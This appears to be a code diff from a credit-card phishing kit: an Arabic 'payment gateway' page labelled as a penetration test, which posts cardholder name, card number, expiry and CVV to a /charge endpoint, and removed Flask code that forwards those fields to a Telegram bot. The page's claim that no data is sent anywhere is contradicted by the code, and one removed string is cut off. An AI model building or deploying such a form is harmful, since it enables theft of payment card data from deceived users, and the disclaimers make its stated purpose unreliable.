@@ -1,43 +1,180 @@
-import os, logging, requests
-from flask import Flask, render_template, request, jsonify
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة دفع – اختبار اختراق</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .warning {
+            background: #ffdddd;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 2px solid red;
+            font-weight: bold;
+        }
+        .payment-card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #333;
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0 16px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row div {
+            flex: 1;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #5a67d8;
+        }
+        .alert {
+            display: none;
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .alert.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        .alert.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-card">
+        <div class="warning">
+            ⚠️ هذا الموقع مخصص فقط لاختبار الاختراق القانوني على أجهزتك الشخصية.<br>
+            إدخال بيانات حقيقية يعرضك للمساءلة القانونية. أنت وحدك المسؤول عن استخدامك.
+        </div>
+        <h2>💳 بوابة الدفع (اختبار اختراق)</h2>
+        <form id="paymentForm">
+            <label>اسم حامل البطاقة</label>
+            <input type="text" id="cardholder" placeholder="مثال: محمد أحمد" required>
 
-app = Flask(__name__)
+            <label>رقم البطاقة</label>
+            <input type="text" id="card_number" placeholder="5274 9600 1234 5678" maxlength="19" required>
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID   = os.environ.get("CHAT_ID")
-TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            <div class="row">
+                <div>
+                    <label>شهر الانتهاء</label>
+                    <input type="text" id="exp_month" placeholder="MM" maxlength="2" required>
+                </div>
+                <div>
+                    <label>سنة الانتهاء</label>
+                    <input type="text" id="exp_year" placeholder="YY" maxlength="2" required>
+                </div>
+                <div>
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
 
-@app.route("/")
-def index():
-    return render_template("index.html")
+            <button type="submit">💳 دفع الآن (محاكاة)</button>
+        </form>
 
-@app.route("/charge", methods=["POST"])
-def charge():
-    card_number = request.form.get("card_number", "")
-    exp_month   = request.form.get("exp_month", "")
-    exp_year    = request.form.get("exp_year", "")
-    cvv         = request.form.get("cvv", "")
-    cardholder  = request.form.get("cardholder", "")
+        <div id="alert" class="alert"></div>
 
-    message = (
-        "💳 *بيانات بطاقة جديدة (امنه)*\n"
-        f"👤 حامل البطاقة: {cardholder}\n"
-        f"🔢 رقم البطاقة: `{card_number}`\n"
-        f"📅 تاريخ الانتهاء: {exp_month}/{exp_year}\n"
-        f"🔐 CVV: `{cvv}`\n"
-        f"⏰ الوقت: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
+        <div class="note">
+            هذه محاكاة لأغراض اختبار الاختراق القانوني. البيانات لا تُرسل لأي جهة حقيقية.
+        </div>
+    </div>
 
-    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    <script>
+        document.getElementById("paymentForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
 
-    try:
-        response = requests.post(TELEGRAM_API, data=payload, timeout=10)
-        if response.status_code != 200:
-            return jsonify({"status": "error", "detail": "فشل الإرسال المعلومات"}), 500
-    except Exception as e:
-        return jsonify({"status": "error", "detail": "خطأ في الاتصال"}), 500
+            const data = {
+                cardholder: document.getElementById("cardholder").value,
+                card_number: document.getElementById("card_number").value.replace(/\s/g, ''),
+                exp_month: document.getElementById("exp_month").value,
+                exp_year: document.getElementById("exp_year").value,
+                cvv: document.getElementById("cvv").value
+            };
 
-    return jsonify({"status": "success", "detail": "تم إرسال البيانات بنجاح 
+            const alertDiv = document.getElementById("alert");
+            alertDiv.className = "alert"; // إخفاء
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+            try {
+                const response = await fetch("/charge", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: new URLSearchParams(data)
+                });
+
+                const result = await response.json();
+
+                if (result.status === "success") {
+                    alertDiv.className = "alert success";
+                    alertDiv.textContent = "✅ " + result.detail;
+                } else {
+                    alertDiv.className = "alert error";
+                    alertDiv.textContent = "❌ " + result.detail;
+                }
+            } catch (error) {
+                alertDiv.className = "alert error";
+                alertDiv.textContent = "❌ حدث خطأ في الاتصال بالخادم.";
+            }
+        });
+    </script>
+</body>
+    </html>
